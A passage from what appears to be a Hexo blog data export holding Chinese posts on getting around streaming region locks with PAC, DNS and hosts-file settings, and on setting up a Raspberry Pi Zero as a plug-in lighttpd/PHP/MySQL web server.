title=\"运行\"></a>运行</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /var/www/html/rpi-TempRuntime</div><div class=\"line\">python LCD.py</div></pre></td></tr></table></figure>\n<h1 id=\"截图\"><a href=\"#截图\" class=\"headerlink\" title=\"截图\"></a>截图</h1><p><img src=\"/content/images/2016/08/WechatIMG10.jpeg\" alt=\"\"></p>\n"},{"title":"海外App生存指南","id":"12","updated":"2016-08-12T22:30:50.000Z","date":"2016-08-12T22:13:34.000Z","_content":"<!-- more --> \n# DNS/PAC大法\n## 优酷土豆爱奇艺\n在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：\n```bash\nhttp://pac.uku.im/pac.pac\n```\n\nDNS:\n```bash\n158.69.209.100\n```\n更新：https://github.com/uku/Unblock-Youku/issues/618\n# 替换hosts大法\n## 网易云音乐\n```bash\n104.236.189.178 http://music.163.com \n198.47.104.134 http://m1.music.126.net \n198.47.104.134 http://m2.music.126.net \n198.47.104.134 http://m3.music.126.net \n198.47.104.134 http://m4.music.126.net\n198.47.104.134 http://m5.music.126.net \n198.47.104.134 http://m6.music.126.net \n198.47.104.134 http://m7.music.126.net \n198.47.104.134 http://m8.music.126.net \n198.47.104.134 http://m9.music.126.net \n198.47.104.134 http://m10.music.126.net\n```\n","source":"_posts/海外App生存指南.md","raw":"---\ntitle: 海外App生存指南\ntags: '其他'\npermalink: hai-wai-appsheng-cun-zhi-nan\nid: 12\nupdated: '2016-08-12 23:30:50'\ndate: 2016-08-12 23:13:34\n---\n<!-- more --> \n# DNS/PAC大法\n## 优酷土豆爱奇艺\n在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：\n```bash\nhttp://pac.uku.im/pac.pac\n```\n\nDNS:\n```bash\n158.69.209.100\n```\n更新：https://github.com/uku/Unblock-Youku/issues/618\n# 替换hosts大法\n## 网易云音乐\n```bash\n104.236.189.178 http://music.163.com \n198.47.104.134 http://m1.music.126.net \n198.47.104.134 http://m2.music.126.net \n198.47.104.134 http://m3.music.126.net \n198.47.104.134 http://m4.music.126.net\n198.47.104.134 http://m5.music.126.net \n198.47.104.134 http://m6.music.126.net \n198.47.104.134 http://m7.music.126.net \n198.47.104.134 http://m8.music.126.net \n198.47.104.134 http://m9.music.126.net \n198.47.104.134 http://m10.music.126.net\n```\n","slug":"hai-wai-appsheng-cun-zhi-nan","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xpe003k5es543abn1fl","content":"<a id=\"more\"></a> \n<h1 id=\"DNS-PAC大法\"><a href=\"#DNS-PAC大法\" class=\"headerlink\" title=\"DNS/PAC大法\"></a>DNS/PAC大法</h1><h2 id=\"优酷土豆爱奇艺\"><a href=\"#优酷土豆爱奇艺\" class=\"headerlink\" title=\"优酷土豆爱奇艺\"></a>优酷土豆爱奇艺</h2><p>在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://pac.uku.im/pac.pac</div></pre></td></tr></table></figure></p>\n<p>DNS:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">158.69.209.100</div></pre></td></tr></table></figure></p>\n<p>更新：<a href=\"https://github.com/uku/Unblock-Youku/issues/618\" target=\"_blank\" rel=\"external\">https://github.com/uku/Unblock-Youku/issues/618</a></p>\n<h1 id=\"替换hosts大法\"><a href=\"#替换hosts大法\" class=\"headerlink\" title=\"替换hosts大法\"></a>替换hosts大法</h1><h2 id=\"网易云音乐\"><a href=\"#网易云音乐\" class=\"headerlink\" title=\"网易云音乐\"></a>网易云音乐</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">104.236.189.178 http://music.163.com </div><div class=\"line\">198.47.104.134 http://m1.music.126.net </div><div class=\"line\">198.47.104.134 http://m2.music.126.net </div><div class=\"line\">198.47.104.134 http://m3.music.126.net </div><div class=\"line\">198.47.104.134 http://m4.music.126.net</div><div class=\"line\">198.47.104.134 http://m5.music.126.net </div><div class=\"line\">198.47.104.134 http://m6.music.126.net </div><div class=\"line\">198.47.104.134 http://m7.music.126.net </div><div class=\"line\">198.47.104.134 http://m8.music.126.net </div><div class=\"line\">198.47.104.134 http://m9.music.126.net </div><div class=\"line\">198.47.104.134 http://m10.music.126.net</div></pre></td></tr></table></figure>\n","excerpt":"","more":"<h1 id=\"DNS-PAC大法\"><a href=\"#DNS-PAC大法\" class=\"headerlink\" title=\"DNS/PAC大法\"></a>DNS/PAC大法</h1><h2 id=\"优酷土豆爱奇艺\"><a href=\"#优酷土豆爱奇艺\" class=\"headerlink\" title=\"优酷土豆爱奇艺\"></a>优酷土豆爱奇艺</h2><p>在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://pac.uku.im/pac.pac</div></pre></td></tr></table></figure></p>\n<p>DNS:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">158.69.209.100</div></pre></td></tr></table></figure></p>\n<p>更新：<a href=\"https://github.com/uku/Unblock-Youku/issues/618\">https://github.com/uku/Unblock-Youku/issues/618</a></p>\n<h1 id=\"替换hosts大法\"><a href=\"#替换hosts大法\" class=\"headerlink\" title=\"替换hosts大法\"></a>替换hosts大法</h1><h2 id=\"网易云音乐\"><a href=\"#网易云音乐\" class=\"headerlink\" title=\"网易云音乐\"></a>网易云音乐</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">104.236.189.178 http://music.163.com </div><div class=\"line\">198.47.104.134 http://m1.music.126.net </div><div class=\"line\">198.47.104.134 http://m2.music.126.net </div><div class=\"line\">198.47.104.134 http://m3.music.126.net </div><div class=\"line\">198.47.104.134 http://m4.music.126.net</div><div class=\"line\">198.47.104.134 http://m5.music.126.net </div><div class=\"line\">198.47.104.134 http://m6.music.126.net </div><div class=\"line\">198.47.104.134 http://m7.music.126.net </div><div class=\"line\">198.47.104.134 http://m8.music.126.net </div><div class=\"line\">198.47.104.134 http://m9.music.126.net </div><div class=\"line\">198.47.104.134 http://m10.music.126.net</div></pre></td></tr></table></figure>"},{"title":"用Raspberry Pi Zero打造“即插即用”的Web服务器","date":"2017-01-12T02:04:44.000Z","header-img":"/content/images/2016/07/stock-photo-132346157-1.jpg","_content":"\n\n虽然Raspberry Pi Zero只有4.5英镑，非常便宜，但确实具有局限性，由于缺少网口、WiFi，功能比较单一，可曾设想，用Raspberry Pi Zero打造一个完美的“即插即用”的Web服务器？\n\n![](/content/images/zeroweb/0.jpg)\n\n何为即插即用？\n\n类似于优盘一样，插上电脑，等待几秒，直接识别为网卡，直接输入树莓派的网址，连接就是自己的网站。\n\n有什么用？\n\n实现本地web本地化，随着前端、后端技术的发展，web应用越来越多，但是web应用受制于网络的限制，一旦没有网络，就没有用武之地。\n\n那么为什么不把web本地化呢？以后拿着“即插即用”的服务器，到任何电脑上，都能随时办公。\n\n# 安装\n\n我们可以把树莓派虚拟为网卡，然后在内网连接它。\n\n1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：\n\n```bash\ndiskutil list\ndiskutil unmountDisk /dev/SD卡的标号 #如disk2\ncd /Users/ivan/Downloads/2016-11-25-raspbian-jessie #进入目录\nsudo dd bs=1m if=2016-11-25-raspbian-jessie.img of=/dev/rdisk2\n```\n2.刷好系统后编辑`config.txt`文件，在最后一行下，另起一行添加：\n```bash\ndtoverlay=dwc2\n```\n保存文件\n\n3.最后，打开`cmdline.txt`文件。\n找到单词`rootwait`，在其之后添加：\n\n```\nmodules-load=dwc2,g_ether\n```\n\n4.添加一个文件名为`ssh`到根目录下，内容为空\n\n\n5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。\n\n![](/content/images/raspizero/1.png)\n\n6.Ping 一下raspberrypi.local看是否能通\n\n```\nPING raspberrypi.local (169.254.70.245): 56 data bytes\n64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms\n64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms\n64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms\n64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms\n```\n\n\n# 配置\n\n1.ssh连接raspberrypi.local，默认密码为raspberry\n```bash\npi@raspberrypi.local\n```\n\n2.通过直接运行``raspi-config``命令\n\n你需要做\n* 容量扩展\n* 更改系统时区\n* 更改系统密码\n\n3.同时你需要通过执行``sudo passwd root``更改root密码\n\n4.在本机设置代理\n\n首先，设置本机名为Mac，在本机搭建一个squid，为了使树莓派安装web server，以后日常使用不需要。\n\n```\nbrew update\nbrew install squid\n```\n5.然后下载[SquidMan](http://squidman.net/squidman/)，安装。\n在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。\n\n\n6.进入树莓派的shell，输入：\n```bash\ncd /etc/apt/apt.conf.d\nsudo vi 50raspi\n```\n最后一行加入一句话：\n```\nAcquire::http::Proxy \"http://Mac.local:8080\";\n```\n保存\n\n7.继续输入``apt-get update``查看是否有网络。\n\n8.安装`lighthttpd+mysql+php`\n\n输入：\n\n```bash\nsudo apt-get install lighttpd mysql-server php5-cgi php5-mysql\n```\n\n等待安装完毕后，修改`php.ini`设置\n\n```\nsudo nano /etc/php5/cgi/php.ini\n```\n去掉这一条注释的`;`\n```\n;cgi.fix_pathinfo = 1\n```\n随后修改``lighttpd.conf``\n```\nsudo nano /etc/lighttpd/lighttpd.conf\n```\n\n在`server.modules`中增加`fastcgi`\n```\nserver.modules = (\n\"mod_access\",\n\"mod_alias\",\n\"mod_compress\",\n# \"mod_redirect\",\n\"mod_fastcgi\",\n# \"mod_rewrite\",\n)\n```\n最后添加\n```\nfastcgi.server = ( \".php\" => ((\n    \"bin-path\" => \"/usr/bin/php5-cgi\",\n    \"socket\" => \"/tmp/php.socket\"\n)))\n```\n\n重启lighttpd服务\n```\nsudo /etc/init.d/lighttpd restart\n```\n\n通过scp协议，上传一个``index.php``文件\n```\n<?php\nphpinfo();\n?>\n```\n删除默认的``index.htm``文件，打开网站``http://自己树莓派名字.local``\n查看是否成功。\n\n![](/content/images/zeroweb/1.png)\n\n不错，接下来的事情，就是把自己的源代码传到树莓派上，不过多叙述。\n\n# 多说一句\n\n从此以后，你只需要带上你的树莓派Zero就可以随时随地的打开自己的私有web服务。但是，树莓派Zero的性能，确实不行，建议跑一跑小型的程序，不要跑太大的程序。\n\n![](/content/images/zeroweb/2.png)\n\n至于应用嘛，其实做什么都可以的。","source":"_posts/用Raspberry-Pi-Zero打造“即插即用”的服务器.md","raw":"---\ntitle: 用Raspberry Pi Zero打造“即插即用”的Web服务器\ndate: 2017-01-12 02:04:44\ntags: Raspberry\ncategories: Rasberry\npermalink: network-zero-web\nheader-img: \"/content/images/2016/07/stock-photo-132346157-1.jpg\"\n---\n\n\n虽然Raspberry Pi Zero只有4.5英镑，非常便宜，但确实具有局限性，由于缺少网口、WiFi，功能比较单一，可曾设想，用Raspberry Pi Zero打造一个完美的“即插即用”的Web服务器？\n\n![](/content/images/zeroweb/0.jpg)\n\n何为即插即用？\n\n类似于优盘一样，插上电脑，等待几秒，直接识别为网卡，直接输入树莓派的网址，连接就是自己的网站。\n\n有什么用？\n\n实现本地web本地化，随着前端、后端技术的发展，web应用越来越多，但是web应用受制于网络的限制，一旦没有网络，就没有用武之地。\n\n那么为什么不把web本地化呢？以后拿着“即插即用”的服务器，到任何电脑上，都能随时办公。\n\n# 安装\n\n我们可以把树莓派虚拟为网卡，然后在内网连接它。\n\n1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：\n\n```bash\ndiskutil list\ndiskutil unmountDisk /dev/SD卡的标号 #如disk2\ncd /Users/ivan/Downloads/2016-11-25-raspbian-jessie #进入目录\nsudo dd bs=1m if=2016-11-25-raspbian-jessie.img of=/dev/rdisk2\n```\n2.刷好系统后编辑`config.txt`文件，在最后一行下，另起一行添加：\n```bash\ndtoverlay=dwc2\n```\n保存文件\n\n3.最后，打开`cmdline.txt`文件。\n找到单词`rootwait`，在其之后添加：\n\n```\nmodules-load=dwc2,g_ether\n```\n\n4.添加一个文件名为`ssh`到根目录下，内容为空\n\n\n5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。\n\n![](/content/images/raspizero/1.png)\n\n6.Ping 一下raspberrypi.local看是否能通\n\n```\nPING raspberrypi.local (169.254.70.245): 56 data bytes\n64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms\n64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms\n64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms\n64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms\n```\n\n\n# 配置\n\n1.ssh连接raspberrypi.local，默认密码为raspberry\n```bash\npi@raspberrypi.local\n```\n\n2.通过直接运行``raspi-config``命令\n\n你需要做\n* 容量扩展\n* 更改系统时区\n* 更改系统密码\n\n3.同时你需要通过执行``sudo passwd root``更改root密码\n\n4.在本机设置代理\n\n首先，设置本机名为Mac，在本机搭建一个squid，为了使树莓派安装web server，以后日常使用不需要。\n\n```\nbrew update\nbrew install squid\n```\n5.然后下载[SquidMan](http://squidman.net/squidman/)，安装。\n在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。\n\n\n6.进入树莓派的shell，输入：\n```bash\ncd /etc/apt/apt.conf.d\nsudo vi 50raspi\n```\n最后一行加入一句话：\n```\nAcquire::http::Proxy \"http://Mac.local:8080\";\n```\n保存\n\n7.继续输入``apt-get update``查看是否有网络。\n\n8.安装`lighthttpd+mysql+php`\n\n输入：\n\n```bash\nsudo apt-get install lighttpd mysql-server php5-cgi php5-mysql\n```\n\n等待安装完毕后，修改`php.ini`设置\n\n```\nsudo nano /etc/php5/cgi/php.ini\n```\n去掉这一条注释的`;`\n```\n;cgi.fix_pathinfo = 1\n```\n随后修改``lighttpd.conf``\n```\nsudo nano /etc/lighttpd/lighttpd.conf\n```\n\n在`server.modules`中增加`fastcgi`\n```\nserver.modules = (\n\"mod_access\",\n\"mod_alias\",\n\"mod_compress\",\n# \"mod_redirect\",\n\"mod_fastcgi\",\n# \"mod_rewrite\",\n)\n```\n最后添加\n```\nfastcgi.server = ( \".php\" => ((\n    \"bin-path\" => \"/usr/bin/php5-cgi\",\n    \"socket\" => \"/tmp/php.socket\"\n)))\n```\n\n重启lighttpd服务\n```\nsudo /etc/init.d/lighttpd restart\n```\n\n通过scp协议，上传一个``index.php``文件\n```\n<?php\nphpinfo();\n?>\n```\n删除默认的``index.htm``文件，打开网站``http://自己树莓派名字.local``\n查看是否成功。\n\n![](/content/images/zeroweb/1.png)\n\n不错，接下来的事情，就是把自己的源代码传到树莓派上，不过多叙述。\n\n# 多说一句\n\n从此以后，你只需要带上你的树莓派Zero就可以随时随地的打开自己的私有web服务。但是，树莓派Zero的性能，确实不行，建议跑一跑小型的程序，不要跑太大的程序。\n\n![](/content/images/zeroweb/2.png)\n\n至于应用嘛，其实做什么都可以的。","slug":"network-zero-web","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xpg003n5es5iafltgn1","content":"<p>虽然Raspberry Pi Zero只有4.5英镑，非常便宜，但确实具有局限性，由于缺少网口、WiFi，功能比较单一，可曾设想，用Raspberry Pi Zero打造一个完美的“即插即用”的Web服务器？</p>\n<p><img src=\"/content/images/zeroweb/0.jpg\" alt=\"\"></p>\n<p>何为即插即用？</p>\n<p>类似于优盘一样，插上电脑，等待几秒，直接识别为网卡，直接输入树莓派的网址，连接就是自己的网站。</p>\n<p>有什么用？</p>\n<p>实现本地web本地化，随着前端、后端技术的发展，web应用越来越多，但是web应用受制于网络的限制，一旦没有网络，就没有用武之地。</p>\n<p>那么为什么不把web本地化呢？以后拿着“即插即用”的服务器，到任何电脑上，都能随时办公。</p>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><p>我们可以把树莓派虚拟为网卡，然后在内网连接它。</p>\n<p>1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">diskutil list</div><div class=\"line\">diskutil unmountDisk /dev/SD卡的标号 <span class=\"comment\">#如disk2</span></div><div class=\"line\"><span class=\"built_in\">cd</span> /Users/ivan/Downloads/2016-11-25-raspbian-jessie <span class=\"comment\">#进入目录</span></div><div class=\"line\">sudo dd bs=1m <span class=\"keyword\">if</span>=2016-11-25-raspbian-jessie.img of=/dev/rdisk2</div></pre></td></tr></table></figure>\n<p>2.刷好系统后编辑<code>config.txt</code>文件，在最后一行下，另起一行添加：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">dtoverlay=dwc2</div></pre></td></tr></table></figure></p>\n<p>保存文件</p>\n<p>3.最后，打开<code>cmdline.txt</code>文件。<br>找到单词<code>rootwait</code>，在其之后添加：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">modules-load=dwc2,g_ether</div></pre></td></tr></table></figure>\n<p>4.添加一个文件名为<code>ssh</code>到根目录下，内容为空</p>\n<p>5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。</p>\n<p><img src=\"/content/images/raspizero/1.png\" alt=\"\"></p>\n<p>6.Ping 一下raspberrypi.local看是否能通</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">PING raspberrypi.local (169.254.70.245): 56 data bytes</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms</div></pre></td></tr></table></figure>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><p>1.ssh连接raspberrypi.local，默认密码为raspberry<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pi@raspberrypi.local</div></pre></td></tr></table></figure></p>\n<p>2.通过直接运行<code>raspi-config</code>命令</p>\n<p>你需要做</p>\n<ul>\n<li>容量扩展</li>\n<li>更改系统时区</li>\n<li>更改系统密码</li>\n</ul>\n<p>3.同时你需要通过执行<code>sudo passwd root</code>更改root密码</p>\n<p>4.在本机设置代理</p>\n<p>首先，设置本机名为Mac，在本机搭建一个squid，为了使树莓派安装web server，以后日常使用不需要。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew update</div><div class=\"line\">brew install squid</div></pre></td></tr></table></figure>\n<p>5.然后下载<a href=\"http://squidman.net/squidman/\" target=\"_blank\" rel=\"external\">SquidMan</a>，安装。<br>在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。</p>\n<p>6.进入树莓派的shell，输入：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /etc/apt/apt.conf.d</div><div class=\"line\">sudo vi 50raspi</div></pre></td></tr></table></figure></p>\n<p>最后一行加入一句话：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">Acquire::http::Proxy &quot;http://Mac.local:8080&quot;;</div></pre></td></tr></table></figure></p>\n<p>保存</p>\n<p>7.继续输入<code>apt-get update</code>查看是否有网络。</p>\n<p>8.安装<code>lighthttpd+mysql+php</code></p>\n<p>输入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install lighttpd mysql-server php5-cgi php5-mysql</div></pre></td></tr></table></figure>\n<p>等待安装完毕后，修改<code>php.ini</code>设置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/php5/cgi/php.ini</div></pre></td></tr></table></figure>\n<p>去掉这一条注释的<code>;</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">;cgi.fix_pathinfo = 1</div></pre></td></tr></table></figure></p>\n<p>随后修改<code>lighttpd.conf</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/lighttpd/lighttpd.conf</div></pre></td></tr></table></figure></p>\n<p>在<code>server.modules</code>中增加<code>fastcgi</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">server.modules = (</div><div class=\"line\">&quot;mod_access&quot;,</div><div class=\"line\">&quot;mod_alias&quot;,</div><div class=\"line\">&quot;mod_compress&quot;,</div><div class=\"line\"># &quot;mod_redirect&quot;,</div><div class=\"line\">&quot;mod_fastcgi&quot;,</div><div class=\"line\"># &quot;mod_rewrite&quot;,</div><div class=\"line\">)</div></pre></td></tr></table></figure></p>\n<p>最后添加<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">fastcgi.server = ( &quot;.php&quot; =&gt; ((</div><div class=\"line\">    &quot;bin-path&quot; =&gt; &quot;/usr/bin/php5-cgi&quot;,</div><div class=\"line\">    &quot;socket&quot; =&gt; &quot;/tmp/php.socket&quot;</div><div class=\"line\">)))</div></pre></td></tr></table></figure></p>\n<p>重启lighttpd服务<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo /etc/init.d/lighttpd restart</div></pre></td></tr></table></figure></p>\n<p>通过scp协议，上传一个<code>index.php</code>文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php</div><div class=\"line\">phpinfo();</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure></p>\n<p>删除默认的<code>index.htm</code>文件，打开网站<code>http://自己树莓派名字.local</code><br>查看是否成功。</p>\n<p><img src=\"/content/images/zeroweb/1.png\" alt=\"\"></p>\n<p>不错，接下来的事情，就是把自己的源代码传到树莓派上，不过多叙述。</p>\n<h1 id=\"多说一句\"><a href=\"#多说一句\" class=\"headerlink\" title=\"多说一句\"></a>多说一句</h1><p>从此以后，你只需要带上你的树莓派Zero就可以随时随地的打开自己的私有web服务。但是，树莓派Zero的性能，确实不行，建议跑一跑小型的程序，不要跑太大的程序。</p>\n<p><img src=\"/content/images/zeroweb/2.png\" alt=\"\"></p>\n<p>至于应用嘛，其实做什么都可以的。</p>\n","excerpt":"","more":"<p>虽然Raspberry Pi Zero只有4.5英镑，非常便宜，但确实具有局限性，由于缺少网口、WiFi，功能比较单一，可曾设想，用Raspberry Pi Zero打造一个完美的“即插即用”的Web服务器？</p>\n<p><img src=\"/content/images/zeroweb/0.jpg\" alt=\"\"></p>\n<p>何为即插即用？</p>\n<p>类似于优盘一样，插上电脑，等待几秒，直接识别为网卡，直接输入树莓派的网址，连接就是自己的网站。</p>\n<p>有什么用？</p>\n<p>实现本地web本地化，随着前端、后端技术的发展，web应用越来越多，但是web应用受制于网络的限制，一旦没有网络，就没有用武之地。</p>\n<p>那么为什么不把web本地化呢？以后拿着“即插即用”的服务器，到任何电脑上，都能随时办公。</p>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><p>我们可以把树莓派虚拟为网卡，然后在内网连接它。</p>\n<p>1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">diskutil list</div><div class=\"line\">diskutil unmountDisk /dev/SD卡的标号 <span class=\"comment\">#如disk2</span></div><div class=\"line\"><span class=\"built_in\">cd</span> /Users/ivan/Downloads/2016-11-25-raspbian-jessie <span class=\"comment\">#进入目录</span></div><div class=\"line\">sudo dd bs=1m <span class=\"keyword\">if</span>=2016-11-25-raspbian-jessie.img of=/dev/rdisk2</div></pre></td></tr></table></figure>\n<p>2.刷好系统后编辑<code>config.txt</code>文件，在最后一行下，另起一行添加：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">dtoverlay=dwc2</div></pre></td></tr></table></figure></p>\n<p>保存文件</p>\n<p>3.最后，打开<code>cmdline.txt</code>文件。<br>找到单词<code>rootwait</code>，在其之后添加：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">modules-load=dwc2,g_ether</div></pre></td></tr></table></figure>\n<p>4.添加一个文件名为<code>ssh</code>到根目录下，内容为空</p>\n<p>5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。</p>\n<p><img src=\"/content/images/raspizero/1.png\" alt=\"\"></p>\n<p>6.Ping 一下raspberrypi.local看是否能通</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">PING raspberrypi.local (169.254.70.245): 56 data bytes</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms</div><div class=\"line\">64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms</div></pre></td></tr></table></figure>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><p>1.ssh连接raspberrypi.local，默认密码为raspberry<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pi@raspberrypi.local</div></pre></td></tr></table></figure></p>\n<p>2.通过直接运行<code>raspi-config</code>命令</p>\n<p>你需要做</p>\n<ul>\n<li>容量扩展</li>\n<li>更改系统时区</li>\n<li>更改系统密码</li>\n</ul>\n<p>3.同时你需要通过执行<code>sudo passwd 